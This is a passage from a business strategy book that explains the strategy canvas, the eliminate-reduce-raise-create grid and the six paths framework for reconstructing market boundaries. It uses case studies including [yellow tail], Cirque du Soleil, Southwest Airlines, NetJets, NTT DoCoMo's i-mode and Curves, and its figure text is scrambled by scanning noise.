drinkers\nmoved up, and drinkers of more expensive wines moved down to become\nconsumers of [yellow tail].\n\nFigure 2-3 shows the extent to which the application of these four actions\nled to a break from the competition in the US wine industry. Here we can\ngraphically compare [yellow tail]’s blue ocean strategy with the more than\none thousand six hundred wineries competing in the United States at the\ntime. As shown in figure 2-3, [yellow tail]’s value curve stands apart. Casella\nWines acted on all four actions—eliminate, reduce, raise, and create—to\nunlock uncontested market space that changed the face of the US wine\nindustry in a span of two years.\n\nFIGURE 2-3\n\nThe strategy canvas of [yellow tail]\nPremium wines\n\n------- peeves ˇ [yellow tail]\n\n/ 5 Budget wines\n\na | | | |\nPrice | Above-the-line Vineyard prestige Wine Ease of\nmarketing and legacy range selection\nUse of enological Aging Wine Easy Fun and\nterminology and quality complexity drinking adventure\ndistinctions in wine\ncommunication\n\nBy looking at the alternatives of beer and ready-to-drink cocktails and\nthinking in terms of noncustomers, Casella Wines created three new factors\nin the US wine industry—easy drinking, ease of selection, and fun and\nadventure—and eliminated or reduced everything else. Casella Wines found\nthat the mass of Americans rejected wine because its complicated taste was\ndifficult to appreciate. Beer and ready-to-drink cocktails, for example, were\nmuch sweeter and easier to drink. Accordingly, [yellow tail] was a\ncompletely new combination of wine characteristics that produced an\nuncomplicated wine structure that was instantly appealing to the mass of\nalcohol drinkers. The wine was soft in taste and approachable like ready-to-\ndrink cocktails and beer, and had up-front, primary flavors and pronounced\nfruit flavors. The sweet fruitiness of the wine also kept people’s palate\nfresher, allowing them to enjoy another glass of wine without thinking about\n\nit. The result was an easy-drinking wine that did not require years to develop\nan appreciation for.\n\nIn line with this simple fruity sweetness, [yellow tail] dramatically\nreduced or eliminated all the factors the wine industry had long competed on\n—tannins, oak, complexity, and aging—in crafting fine wine, whether it was\nfor the premium or the budget segment. With the need for aging eliminated,\nthe needed working capital for aging wine at Casella Wines was also\nreduced, creating a faster payback for the wine produced. The wine industry\ncriticized the sweet fruitiness of [yellow tail] wine, seeing it as significantly\nlowering the quality of wine and working against proper appreciation of fine\ngrapes and historic wine craftsmanship. These claims may have been true,\nbut customers of all sorts loved the wine.\n\nWine retailers in the United States offered buyers aisles of wine varieties,\nbut to the general consumer the choice was overwhelming and intimidating.\nThe bottles looked the same, labels were complicated with enological\nterminology understandable only to the wine connoisseur or hobbyist, and\nthe choice was so extensive that salesclerks at retail shops were at an equal\ndisadvantage in understanding or recommending wine to bewildered\npotential buyers. Moreover, the rows of wine choice fatigued and\ndemotivated customers, making selection a difficult process that left the\naverage wine purchaser insecure with their choice.\n\n[yellow tail] changed all that by creating ease of selection. It dramatically\nreduced the range of wines offered, creating only two at the start:\nChardonnay, the most popular white in the United States, and a red, Shiraz.\nIt removed all technical jargon from the bottles and created instead a\nstriking, simple, and nontraditional label featuring a kangaroo in bright,\nvibrant colors of orange and yellow on a black background. The wine boxes\n[yellow tail] came in were also of the same vibrant colors, with the name\n[yellow tail] printed boldly on the sides; the boxes served the dual purpose\nof acting as eye-catching, unintimidating displays for the wine.\n\n[yellow tail] hit a home run in ease of selection when it made retail shop\nemployees the ambassadors of [yellow tail] at its launch by giving them\nAustralian outback clothing, including bushman’s hats and oilskin jackets to\nwear at work. The retail employees were inspired by the branded clothing\nand having a wine they themselves did not feel intimidated by, and\nrecommendations to buy [yellow tail] flew out of their mouths. In short, it\nwas fun to recommend [yellow tail].\n\nThe simplicity of offering only two wines at the start—a red and a white\n—streamlined Casella Wines’ business model. Minimizing the stockkeeping\nunits maximized its stock turnover and minimized investment in warehouse\ninventory. In fact, this reduction of variety was carried over to the bottles\ninside the cases. [yellow tail] broke industry conventions. Casella Wines was\nthe first company to put both red and white wine in the same-shaped bottle, a\npractice that created further simplicity in manufacturing and purchasing and\nresulted in stunningly simple wine displays.\n\nThe wine industry worldwide was proud to promote wine as a refined\nbeverage with a long history and tradition. This is reflected in the target\nmarket for the United States: educated professionals in the upper-income\nbrackets. Hence, the continuous focus on the quality and legacy of the\nvineyard, the chateau’s or estate’s historical tradition, and the wine medals\nwon. Indeed the growth strategies of the major players in the US wine\nindustry were targeted at the premium end of the market, with tens of\nmillions invested in brand advertising to strengthen this image. By looking\nto beer and ready-to-drink cocktail customers, however, [yellow tail] found\nthat this elite image did not resonate with the general public, which found it\nintimidating. So [yellow tail] broke with tradition and created a personality\nthat embodied the characteristics of the Australian culture: bold, laid back,\nfun, and adventurous. Approachability was the mantra: “The essence of a\ngreat land... Australia.” There was no traditional winery image. The\nlowercase spelling of the name [yellow tail], coupled with the vibrant colors\nand the kangaroo motif, echoed Australia and made people smile. And\nindeed no reference to the vineyard was made on the bottle. The wine\npromised to jump from the glass like an Aussie kangaroo.\n\nThe result is that [yellow tail] appealed to a broad cross section of alcohol\nbeverage consumers. By offering this leap in value, [yellow tail] raised the\nprice of its wines above the budget market, pricing them then at $6.99 a\nbottle, more than double the price of a jug wine at the time. From the\nmoment the wine hit the retail shelves in July 2001, sales took off. Today,\nover a decade later, its price stands at $7.49 in the United States.\nThe Eliminate-Reduce-Raise-Create Grid\n\nThere is a third tool that is key to creation of blue oceans. It is a\nsupplementary analytic to the four actions framework called the eliminate-\nreduce-raise-create grid (see figure 2-4). The grid pushes companies not\nonly to ask all four questions in the four actions framework but also to act on\nall four to create a new value curve. By driving companies to fill in the grid\nwith the actions of eliminating and reducing as well as raising and creating,\nthe grid gives companies four immediate benefits:\n\nFIGURE 2-4\n\nEliminate-reduce-raise-create grid: The case of [yellow tail]\n\nEliminate Raise\n\nEnological terminology\n\nand distinctions Price versus\nbudget wines\n\nAbove-the-line marketing\n\nAging qualities\n\nReduce Create\n\nVineyard prestige and legacy Easy drinking\n\nWine complexity Ease of selection including\nretail store support\n\nWine range\nFun and adventure\n\n* It pushes them to simultaneously pursue differentiation and low costs to\nbreak the value-cost trade-off.\n\n¢ It immediately flags companies that are focused only on raising and\ncreating and thereby lifting their cost structure and often\noverengineering products and services—a common plight in many\ncompanies.\n\n* It is easily understood by managers at any level, creating a high level of\nengagement in its application.\n\n¢ Because completing the grid is a challenging task, it drives companies\nto robustly scrutinize every factor the industry competes on, making\nthem discover the range of implicit assumptions they make\nunconsciously in competing.\n\nFigure 2-5, the eliminate-reduce-raise-create grid for Cirque du Soleil,\nprovides another snapshot of this tool in action and shows what it reveals.\nWorth noting is the range of factors that an industry has long competed on\nthat companies discover can be eliminated and reduced. In the case of\nCirque du Soleil, it eliminated several factors from traditional circuses, such\nas animal shows, star performers, and multiple show arenas. These factors\nhad long been taken for granted in the traditional circus industry, which\nnever questioned their ongoing relevance. However, there was increasing\npublic discomfort with the use of animals. Moreover, animal acts are one of\nthe most expensive elements; not only is there the cost of the animals, but\nalso their training, medical care, housing, insurance, and transportation.\nSimilarly, although the circus industry focused on featuring stars, in the\nmind of the public the so-called stars of the circus were trivial next to movie\nstars or famous singers. Again, they were a high-cost component carrying\nlittle sway with spectators. Gone, too, are three-ring venues. Not only did\nthese create angst among spectators as they rapidly switched their gaze from\none ring to the other, but they also increased the number of performers\nneeded, with the obvious cost implications.\n\nFIGURE 2-5\n\nEliminate-reduce-raise-create grid: The case of Cirque du Soleil\nPrice\nUnique venue\n\nCreate\n\nTheme\nRefined environment\nMultiple productions\n\nArtistic music and dance\n\nEliminate\n\nStar performers\nAnimal shows\n\nAisle concession sales\nMultiple show arenas\n\nReduce\n\nFun and humor\n\nThrill and danger\n\nThree Characteristics of a Good Strategy\n\n[yellow tail], like Cirque du Soleil, created a unique and exceptional value\ncurve to unlock a blue ocean. As shown in the strategy canvas, [yellow\ntail]’s value curve has focus; the company did not diffuse its efforts across\nall key factors of competition. The shape of its value curve diverged from\nthe other players’, a result of not benchmarking competitors but instead\nlooking across alternatives. The tagline of [yellow tail]’s strategic profile\nwas clear: a fun and simple wine to be enjoyed every day.\n\nWhen expressed through a value curve, then, an effective blue ocean\nstrategy like [yellow tail]’s has three complementary qualities: focus,\ndivergence, and a compelling tagline. Without these qualities, a company’s\nstrategy will likely be muddled, undifferentiated, and hard to communicate\nwith a high cost structure. The four actions of creating a new value curve\nshould be well guided toward building a company’s strategic profile with\nthese characteristics. These three characteristics serve as an initial litmus\ntest of the commercial viability of blue ocean ideas.\n\nA look at Southwest Airlines’ strategic profile illustrates how these three\nqualities underlie the company’s effective strategy in reinventing the short-\nhaul airline industry via value innovation (see figure 2-6). Southwest\nAirlines created a blue ocean by breaking the trade-offs customers had to\nmake between the speed of airplanes and the economy and flexibility of car\ntransport. To achieve this, Southwest offered high-speed transport with\nfrequent and flexible departures at prices attractive to the mass of buyers.\nBy eliminating and reducing certain factors of competition and raising\nothers in the traditional airline industry, as well as by creating new factors\ndrawn from the alternative industry of car transport, Southwest Airlines was\nable to offer unprecedented utility for air travelers and achieve a leap in\nvalue with a low-cost business model.\n\nThe value curve of Southwest Airlines differs distinctively from those of\nits competitors in the strategy canvas. Its strategic profile is a typical\nexample of a compelling blue ocean strategy.\nFocus\n\nEvery great strategy has focus, and a company’s strategic profile, or value\ncurve, should clearly show it. Looking at Southwest’s profile, we can see at\nonce that the company emphasizes only three factors: friendly service,\nspeed, and frequent point-to-point departures. By focusing in this way,\nSouthwest has been able to price against car transportation; it doesn’t make\nextra investments in meals, lounges, and seating choices. By contrast,\nSouthwest’s traditional competitors invest in all the airline industry’s\ncompetitive factors, making it much more difficult for them to match\nSouthwest’s prices. Investing across the board, these companies let their\ncompetitors’ moves set their own agendas. Costly business models result.\n\nFIGURE 2-6\n\nThe strategy canvas of Southwest Airlines\n\nHigh rr রে\n\nSouthwest\n\n、\nAverage *,\nairlines\n\nSeating connectivity Lounges Friendly Frequent\nClass choices service point-to-point\ndepartures\nDivergence\n\nWhen a company’s strategy is formed reactively as it tries to keep up with\nthe competition, it loses its uniqueness. Consider the similarities in most\nairlines’ meals and business-class lounges. On the strategy canvas,\ntherefore, reactive strategists tend to share the same strategic profile.\nIndeed, in the case of Southwest, the value curves of the company’s\ncompetitors are virtually identical and therefore can be summarized on the\nstrategy canvas with a single value curve.\n\nIn contrast, the value curves of blue ocean strategists always stand apart.\nBy applying the four actions of eliminating, reducing, raising, and creating,\nthey differentiate their profiles from the industry’s average profile.\nSouthwest, for example, pioneered point-to-point travel between midsize\ncities; previously, the industry operated through hub-and-spoke systems.\nCompelling Tagline\n\nA good strategy has a clear-cut and compelling tagline. “The speed of a\nplane at the price of a car—whenever you need it.” That’s the tagline of\nSouthwest Airlines, or at least it could be. What could Southwest’s\ncompetitors say? Even the most proficient ad agency would have difficulty\nreducing the conventional offering of meals, seat choices, lounges, and hub\nlinks, with standard service, slower speeds, and higher prices into a\nmemorable tagline. A good tagline must not only deliver a clear message but\nalso advertise an offering truthfully, or else customers will lose trust and\ninterest. In fact, a good way to test the effectiveness and strength of a\nstrategy is to look at whether it contains a strong and authentic tagline.\n\nAs shown in figure 2-7, Cirque du Soleil’s strategic profile also met the\nthree criteria that define blue ocean strategy: focus, divergence, and a\ncompelling tagline. Cirque du Soleil’s strategy canvas allows us to\ngraphically compare its strategic profile with those of its major competitors.\nThe canvas shows clearly the extent of Cirque du Soleil’s departure from the\nconventional logic of the circus. The figure shows that the value curve of\nRingling Bros. and Barnum & Bailey is the same basic shape as those of\nsmaller regional circuses. The main difference is that regional circuses offer\nless of each competing factor because of their restricted resources.\n\nBy contrast, Cirque du Soleil’s value curve stands apart. It has new and\nnoncircus factors such as theme, multiple productions, refined watching\nenvironment, and artistic music and dance. These factors, entirely new\ncreations for the circus industry, are drawn from the alternative live\nentertainment industry of theater. In this way, the strategy canvas clearly\ndepicts the traditional factors that affect competition among industry players,\nas well as new factors that lead to creation of new market space and that\nshift the strategy canvas of an industry.\n\nFIGURE 2-7\n\nThe strategy canvas of Cirque du Soleil\nHigh\n\nRingling Bros. and Barnum & Bailey value curve\n\n7\n۳ ۰\n\n东 i .\n\nCirque du Soleil\n\nvalue curve\n\n' Smaller 、\nregional \\\"\n4 circuses 1\n7 3\nrf >\nLow\nPrice Animal Multiple Thrills and Theme Multiple\nshows show danger productions\nStar Aisle arenas Fun Unique Refined Artistic\nperformers concessions and venue watching music\nhumor environment and dance\n\n[yellow tail], Cirque du Soleil, and Southwest Airlines created blue oceans\nin very different business situations and industrial contexts. However, their\nstrategic profiles shared the same three characteristics: focus, divergence,\nand a compelling tagline. These three criteria guide companies in carrying\nout the process of reconstruction to arrive at a breakthrough in value both for\n\nbuyers and for themselves.\n\nReading the Value Curves\n\nThe strategy canvas enables companies to see the future in the present. To\nachieve this, companies must understand how to read value curves.\nEmbedded in the value curves of an industry is a wealth of strategic\nknowledge on the current status and future of a business.\nA Blue Ocean Strategy\n\nThe first question the value curves answer is whether a business deserves to\nbe a winner. When a company’s value curve, or its competitors’, meets the\nthree criteria that define a good blue ocean strategy—focus, divergence, and\na compelling tagline that speaks to the market—the company is on the right\ntrack. These three criteria serve as an initial litmus test of the commercial\nviability of blue ocean ideas.\n\nOn the other hand, when a company’s value curve lacks focus, its cost\nstructure will tend to be high and its business model complex in\nimplementation and execution. When it lacks divergence, a company’s\nstrategy is a me-too, with no reason to stand apart in the marketplace. When\nit lacks a compelling tagline that speaks to buyers, it is likely to be\ninternally driven or a classic example of innovation for innovation’s sake\nwith no great commercial potential and no natural take-off capability.\nA Company Caught in the Red Ocean\n\nWhen a company’s value curve converges with its competitors, it signals\nthat a company is likely caught within the red ocean of bloody competition.\nA company’s explicit or implicit strategy tends to be trying to outdo its\ncompetition on the basis of cost or quality. This signals slow growth unless,\nby the grace of luck, the company benefits from being in an industry that is\ngrowing on its own accord. This growth is not due to a company’s strategy,\nhowever, but to luck.\nOverdelivery without Payback\n\nWhen a company’s value curve on the strategy canvas is shown to deliver\nhigh levels across all factors, the question is, Does the company’s market\nshare and profitability reflect these investments? If not, the strategy canvas\nsignals that the company may be oversupplying its customers, offering too\nmuch of those elements that add incremental value to buyers. To value-\ninnovate, the company must decide which factors to eliminate and reduce—\nand not only those to raise and create—to construct a divergent value curve.\nStrategic Contradictions\n\nAre there strategic contradictions? These are areas where a company is\noffering a high level on one competing factor while ignoring others that\nsupport that factor. An example is investing heavily in making a company’s\nwebsite easy to use but failing to correct the site’s slow speed of operation.\nStrategic inconsistencies can also be found between the level of your\noffering and your price. For example, a petroleum station company found\nthat it offered “less for more”: fewer services than the best competitor at a\nhigher price. No wonder it was losing market share fast.\nAn Internally Driven Company\n\nIn drawing the strategy canvas, how does a company label the industry’s\ncompeting factors? For example, does it use the word megahertz instead of\nspeed, or thermal water temperature instead of hot water? Are the\ncompeting factors stated in terms buyers can understand and value, or are\nthey in operational jargon? The kind of language used in the strategy canvas\ngives insight as to whether a company’s strategic vision is built on an\n“outside-in” perspective, driven by the demand side, or an “inside-out”\nperspective that is operationally driven. Analyzing the language of the\nstrategy canvas helps a company understand how far it is from creating\nindustry demand.\n\nThe tools and frameworks introduced here are essential analytics used\nthroughout this book, and supplementary tools are introduced in other\nchapters as needed. It is the intersection between these analytic techniques\nand the eight principles of formulating and executing blue oceans that allow\ncompanies to break from the competition and unlock uncontested market\nspace.\n\nNow we move on to the first principle, reconstructing market boundaries.\nIn the next chapter we discuss the opportunity-maximizing and risk-\nminimizing paths to creating blue oceans.\nPART TWO\n“~*~\n\nFormulating Blue Ocean Strategy\nCHAPTER 3\n\nReconstruct Market Boundaries\n\nTHE FirST PRINCIPLE of blue ocean strategy is to reconstruct market\nboundaries to break from the competition and create blue oceans. This\nprinciple addresses the search risk many companies struggle with. The\nchallenge is to successfully identify, out of the haystack of possibilities that\nexist, commercially compelling blue ocean opportunities. This challenge is\nkey because managers cannot afford to be riverboat gamblers betting their\nstrategy on intuition or on a random drawing.\n\nIn conducting our research, we sought to discover whether there were\nsystematic patterns for reconstructing market boundaries to create blue\noceans. And, if there were, we wanted to know whether these patterns\napplied across all types of industry sectors—from consumer goods, to\nindustrial products, to finance and services, to telecoms and IT, to\npharmaceuticals and B2 B—or were they limited to specific industries?\n\nWe found clear patterns for creating blue oceans. Specifically, we found\nsix basic approaches to remaking market boundaries. We call this the six\npaths framework. These paths have general applicability across industry\nsectors, and they lead companies into the corridor of commercially viable\nblue ocean ideas. None of these paths requires special vision or foresight\nabout the future. All are based on looking at familiar data from a new\nperspective. These paths challenge the six fundamental assumptions\nunderlying many companies’ strategies. These six assumptions, on which\nmost companies hypnotically build their strategies, keep companies trapped\ncompeting in red oceans. Specifically, companies tend to do the following:\n\n¢ Define their industry similarly and focus on being the best within it\n\n‎Look at their industries through the lens of generally accepted strategic‏ ٭\n‎groups (such as luxury automobiles, economy cars, and family‏\n    vehicles), and strive to stand out in the strategic group they play in‏\n\n‎* Focus on the same buyer group, be it the purchaser (as in the office\nequipment industry), the user (as in the clothing industry), or the\ninfluencer (as in the pharmaceutical industry)\n\n‎¢ Define the scope of the products and services offered by their industry\nsimilarly\n\n‎e Accept their industry’s functional or emotional orientation\n\n‎¢ Focus on the same point in time—and often on current competitive\nthreats—in formulating strategy\n\n‎The more that companies share this conventional wisdom about how they\ncompete, the greater the competitive convergence among them.\n\n‎To break out of red oceans, companies must break out of the accepted\nboundaries that define how they compete. Instead of looking within these\nboundaries, managers need to look systematically across them to create blue\noceans. They need to look across alternative industries, across strategic\ngroups, across buyer groups, across complementary product and service\nofferings, across the functional-emotional orientation of an industry, and\neven across time. This gives companies keen insight into how to reconstruct\nmarket realities to open up blue oceans. Let’s examine how each of these\nsix paths works.\nPath 1: Look Across Alternative Industries\n\nIn the broadest sense, a company competes not only with the other firms in\nits own industry but also with companies in those other industries that\nproduce alternative products or services. Alternatives are broader than\nsubstitutes. Products or services that have different forms but offer the same\nfunctionality or core utility are often substitutes for each other. On the other\nhand, alternatives include products or services that have different functions\nand forms but the same purpose.\n\nFor example, to sort out their personal finances, people can buy and install\na financial software package, hire a CPA, or simply use pencil and paper.\nAnd nowadays there are also apps that help with this. The software, the CPA,\nthe pencil and financial apps are largely substitutes for each other. They have\nvery different forms but serve the same function: helping people manage\ntheir financial affairs.\n\nIn contrast, products or services can take different forms and perform\ndifferent functions but serve the same objective. Consider cinemas versus\nrestaurants. Restaurants have few physical features in common with cinemas\nand serve a distinct function: they provide conversational and gastronomical\npleasure. This is a very different experience from the visual entertainment\noffered by cinemas. Despite the differences in form and function, however,\npeople go to a restaurant for the same objective that they go to the movies: to\nenjoy a night out. These are not substitutes, but alternatives to choose from.\n\nIn making every purchase decision, buyers implicitly weigh alternatives,\noften unconsciously. Do you need a self-indulgent two hours? What should\nyou do to achieve it? Do you go to the movies, have a massage, or enjoy\nreading a favorite book at a local café? The thought process is intuitive for\nindividual consumers and industrial buyers alike.\n\nFor some reason, we often abandon this intuitive thinking when we\nbecome sellers. Rarely do sellers think consciously about how their\ncustomers make trade-offs across alternative industries. A shift in price, a\nchange in model, even a new ad campaign can elicit a tremendous response\nfrom rivals within an industry, but the same actions in an alternative industry\nusually go unnoticed. Trade journals, trade shows, and consumer rating\nreports reinforce the vertical walls between one industry and another. Often,\nhowever, the space between alternative industries provides opportunities for\nvalue innovation.\n\nConsider NetJets, which created the blue ocean of fractional jet\nownership. In less than twenty years since its inception, NetJets grew larger\nthan many airlines, with more than five hundred aircraft, operating more\nthan two hundred fifty thousand flights to more than one hundred forty\ncountries. Today those numbers are even higher, with a fleet of over seven\nhundred aircraft, flying to over one hundred seventy countries. Purchased by\nBerkshire Hathaway in 1998, NetJets is a multibillion-dollar business with\nthe largest private jet fleet in the world. NetJets’ success has been attributed\nto its flexibility, shortened travel time, hassle-free travel experience,\nincreased reliability, and strategic pricing. The reality is that NetJets\nreconstructed market boundaries to create this blue ocean by looking across\nalternative industries.\n\nThe most lucrative mass of customers in the aviation industry is corporate\ntravelers. NetJets looked at the existing alternatives and found that when\nbusiness travelers want to fly, they have two principal choices. On the one\nhand, a company’s executives can fly business class or first class on a\ncommercial airline. On the other hand, a company can purchase its own\naircraft to serve its corporate travel needs. The strategic question is, Why\nwould corporations choose one alternative industry over another? By\nfocusing on the key factors that lead corporations to trade across alternatives\nand eliminating or reducing everything else, NetJets created its blue ocean\nstrategy.\n\nConsider this: Why do corporations choose to use commercial airlines for\ntheir corporate travel? Surely it’s not because of the long check-in and\nsecurity lines, hectic flight transfers, overnight stays, or congested airports.\nRather, they choose commercial airlines for only one reason: costs. On the\none hand, commercial travel avoids the high up-front, fixed-cost investment\nof a multimillion-dollar jet aircraft. On the other hand, a company purchases\nonly the number of corporate airline tickets needed per year, lowering\nvariable costs and reducing the possibility of unused aviation travel time that\noften accompanies the ownership of corporate jets.\n\nSo NetJets created the concept of selling fractions of jets, which can be as\nsmall as one-sixteenth ownership of an aircraft in the United States, entitling\ncustomers to fifty flight hours per year. Starting at just over $400,000 (plus\npilot, maintenance, and other monthly costs), owners can purchase a share in\na $7 million aircraft.! Customers get the convenience of a private jet at the\nprice of first-and business-class air travel. Comparing first-class travel with\nprivate aircraft, the National Business Aviation Association found that when\ndirect and indirect costs—hotel, meals, travel time, expenses—were factored\nin, the cost of first-class commercial travel was higher.” As for NetJets, it\navoids the fixed costs that commercial airlines attempt to cover by filling\nlarger and larger aircraft. NetJets’ smaller airplanes, the use of smaller\nregional airports, and limited staff help to keep costs low.\n\nTo understand the rest of the NetJets formula, consider the flip side: Why\ndo people choose corporate jets over commercial travel? Certainly it is not to\npay the multimillion-dollar price to purchase planes. Nor is it to set up a\ndedicated flight department to take care of scheduling and other\nadministrative matters. Nor is it to pay so-called deadhead costs—the costs\nof flying the aircraft from its home base to where it is needed. Rather,\ncorporations and wealthy individuals buy private jets to dramatically cut\ntotal travel time, to reduce the hassle of congested airports, to allow for\npoint-to-point travel, and to gain the benefit of being more productive and\narriving energized, ready to hit the ground running. So NetJets built on these\ndistinctive strengths. Whereas 70 percent of commercial flights go to only\nthirty airports across the United States, NetJets offers access to more than\ntwo thousand airports in the US and five thousand airports around the world\nwith convenient locations near business centers and popular destinations. On\ninternational flights, your plane pulls directly up to the customs office.\n\nWith point-to-point service and the exponential increase in the number of\nairports to land in, there are no flight transfers; trips that would otherwise\nrequire overnight stays can be completed in a single day. The time from your\ncar to takeoff is measured in minutes instead of hours. For example, whereas\na flight from Washington, DC, to Sacramento would take on average 10.5\nhours using commercial airlines, it is only 5.2 hours on a NetJets aircraft;\nfrom Palm Springs to Cabo San Lucas takes on average 6 hours commercial,\nand only 2.1 hours via NetJets. NetJets offers substantial cost savings in total\ntravel time.\n\nPerhaps most appealing, your jet is always available with only four hours’\nnotice. If a jet is not available, NetJets will charter one for you. Last but not\nleast, NetJets dramatically reduces issues related to security threats and\noffers clients customized in-flight service, such as having your favorite food\nand beverages ready for you when you board.\n\nBy offering the best of commercial travel and private jets and eliminating\nand reducing everything else, NetJets opened up a multibillion-dollar blue\nocean wherein customers get the convenience and speed of a private jet with\na low fixed cost and the lower variable cost of first-and business-class\ncommercial airline travel (see figure 3-1). And the competition? Now, nearly\nthirty years later, NetJets’ share of the blue ocean it unlocked still stands a\nstaggering five times greater than that of its nearest competitor.°\n\nFIGURE 3-1\n\nThe strategy canvas of NetJets\nHigh\nPrivate jet\nCorporate travel\n\nSey er ‏بد‎\n\n.\n‏ہہ‎\n‎ঢা\n‎.\n‎.\n‎se.\n\nNetJets’ value curve\n\nক A Commercial airlines\n1 / First- and business-class business travel\np\n\nme | | | | | |\n\nPrice Need for Deadhead Speedoftotal Ease of travel Flexibility In-flight\n\n(fixed customers costs travel time (including and service\npurchase to manage check-in, reliability\n+ variable aircraft customs, etc.)\nprice per (aircraft\n\nflight) management\n\nand administration)\n\nThe biggest telecommunications success in Japan since the 1980s also has\nits roots in path 1. Here we are speaking of NTT DoCoMo’s i-mode, which\nwas launched in 1999. The i-mode service changed the way people\ncommunicate and access information in Japan. NTT DoCoMo’s insight into\ncreating a blue ocean came by thinking about why people trade across the\nalternatives of mobile phones and the internet. With deregulation of the\nJapanese telecommunications industry, new competitors were entering the\nmarket and price competition and technological races were the norm. The\nresult was that costs were rising while the average revenue per user fell.\nNTT DoCoMo broke out of this red ocean of bloody competition by creating\na blue ocean of wireless transmission that reconstructed the mobile phone\nindustry and the internet.\n\nNTT DoCoMo asked, What are the distinctive strengths of the internet\nover cell phones, and vice versa? Although the internet offered endless\ninformation and services, the killer apps were e-mail, simple information\n(such as news, weather forecasts, and a telephone directory), and\nentertainment (including games, events, and music entertainment). The key\ndownside of the internet was the far higher price of computer hardware\nneeded to access the internet at the time, an overload of information, the\nnuisance of logging on to go online, and the fear of giving credit card\ninformation over the internet. On the other hand, the distinctive strengths of\nmobile phones were their mobility, voice transmission, and ease of use.\n\nNTT DoCoMo broke the trade-off that existed at the time between these\ntwo alternatives, not by creating new technology but by focusing on the\ndecisive advantages that the internet has over the cell phone and vice versa.\nThe company eliminated or reduced everything else. Its user-friendly\ninterface has one simple button, the i-mode button (i standing for interactive,\ninternet, information, and the English pronoun 4), which users press to give\nthem immediate access to the few killer apps of the internet. Instead of\nbarraging you with infinite information as on the internet, however, the 1-\nmode button acts as a hotel concierge service, connecting only to preselected\nand preapproved sites for the most popular internet applications. That makes\nnavigation fast and easy. At the same time, even though the i-mode phone\nwas priced 25 percent higher than a regular cell phone, the price of the 1-\nmode phone was dramatically less than that of a PC or laptop, which were\nthe dominant means to access the internet at the time, and its mobility was\nhigh.\n\nMoreover, beyond adding voice, the i-mode used a simple billing service\nwhereby all the services used on the web via the i-mode got billed to the user\non the same monthly bill. This dramatically reduced the number of bills\nusers received and eliminated the need to give credit card details on the\ninternet. And because the i-mode service was automatically turned on\nwhenever the phone was on, users were always connected and had no need\nto go through the hassle of logging on.\n\nNeither the standard cell phone nor the PC or laptop could compete with i-\nmode’s divergent value curve. By 2009, ten years after its launch, i-mode\nsubscribers had climbed to just shy of 50 million and its revenue from the\ntransmission of data, pictures, and text increased from 295 million yen ($2.6\nmillion) in 1999 to 1,589 billion yen ($17 billion). The i-mode service did\nnot simply win customers from competitors. It dramatically grew the market,\ndrawing in youth and senior citizens and converting voice-only customers to\nvoice and data transmission customers. The i-mode was the world’s first\nsmart phone to achieve mass adoption by a country. It wasn’t until 2007 that\nthe iPhone was launched, which seriously challenged the i-mode and created\na new and even larger blue ocean space with the introduction of apps (see\npath 4).\n\nMany other well-known success stories have looked across alternatives to\ncreate new markets. The Home Depot offered the expertise of professional\nhome contractors at markedly lower prices than hardware stores. By\ndelivering the decisive advantages of both alternative industries—and\neliminating or reducing everything else—The Home Depot has transformed\nenormous latent demand for home improvement into real demand, making\nordinary homeowners into do-it-yourselfers. Today it is the world’s largest\nhome retail improvement store. Southwest Airlines concentrated on driving\nas the alternative to flying, providing the speed of air travel at the price and\nflexibility of car travel to create the blue ocean of short-haul air travel.\nSimilarly, Intuit looked to the pencil as the chief alternative to personal\nfinancial software to develop the fun and intuitive Quicken software. Today,\nmore than thirty years on, Quicken still remains the number-one-selling\npersonal financial software, even as Intuit explores the creation of new blue\noceans in online financial services and apps.\n\nWhat are the alternative industries to your industry? Why do customers\ntrade across them? By focusing on the key factors that lead buyers to trade\nacross alternative industries and eliminating or reducing everything else, you\ncan create a blue ocean of new market space.\nPath 2: Look Across Strategic Groups within\nIndustries\n\nJust as blue oceans can often be created by looking across alternative\nindustries, so can they be unlocked by looking across strategic groups. The\nterm refers to a group of companies within an industry that pursue a similar\nstrategy. In most industries, the fundamental strategic differences among\nindustry players are captured by a small number of strategic groups.\n\nStrategic groups can generally be ranked in a rough hierarchical order\nbuilt on two dimensions: price and performance. Each jump in price tends to\nbring a corresponding jump in some dimensions of performance. Most\ncompanies focus on improving their competitive position within a strategic\ngroup. Mercedes, BMW, and Jaguar, for example, focus on outcompeting\none another in the luxury car segment as economy carmakers focus on\nexcelling over one another in their strategic group. Neither strategic group,\nhowever, pays much heed to what the other is doing because from a supply\npoint of view they do not seem to be competing.\n\nThe key to creating a blue ocean across existing strategic groups is to\nbreak out of this narrow tunnel vision by understanding which factors\ndetermine customers’ decisions to trade up or down from one group to\nanother.\n\nConsider Curves, the Texas-based women’s fitness company, which began\nfranchising in 1995. In the space of ten years, it had more than two million\nmembers. What’s more, this growth was triggered almost entirely through\nword of mouth and buddy referrals. Yet, at its inception, Curves was seen as\nentering an oversaturated market, gearing its offering to customers who\nwould not want it, and making its offering significantly blander than the\ncompetition’s. In reality, however, Curves created new demand in the US\nfitness industry, unlocking an untapped market, a veritable blue ocean of\nwomen struggling and failing to keep in shape through sound fitness. Curves\nbuilt on the decisive advantages of two strategic groups in the US fitness\nindustry—traditional health clubs and home exercise programs—and\neliminated or reduced everything else.\n\nAt the one extreme, the US fitness industry was awash with traditional\nhealth clubs that catered to both men and women, offering a full range of\nexercise and sporting options, usually in upscale urban locations. Their\ntrendy facilities were designed to attract the high-end health club set. They\nhad the full range of aerobic and strength training machines, a juice bar,\ninstructors, and a full locker room with showers and sauna, because the aim\nwas for customers to spend social as well as exercise time there. Having\nfought their way across town to health clubs, customers would typically\nspend at least an hour there, and more often two. Membership fees for all\nthis were in the range of $100 per month at the time—not cheap,\nguaranteeing that the market would stay upscale and small. Traditional\nhealth club customers represented only 12 percent of the entire population,\nconcentrated overwhelmingly in the larger urban areas. Investment costs for\na traditional full-service health club ran from $500,000 to more than $1\nmillion, depending on the city center location.\n\nAt the other extreme was the strategic group of home exercise programs,\nsuch as exercise videos, books, and magazines. These were a small fraction\nof the cost, were used at home, and generally required little or no exercise\nequipment. Instruction was minimal, being confined to the star of the\nexercise video or book and magazine explanations and illustrations.\n\nThe question is, What made women trade either up or down between\ntraditional health clubs and home exercise programs? Most women don’t\ntrade up to health clubs for the profusion of special machines, juice bars,\nlocker rooms with sauna, pool, and the chance to meet men. The average\nfemale nonathlete does not even want to run into men when she is working\nout, perhaps revealing lumps in her leotards. She is not inspired to line up\nbehind machines in which she needs to change weights and adjust their\nincline angles. As for time, it has become an increasingly scarce commodity\nfor the average woman. Few can 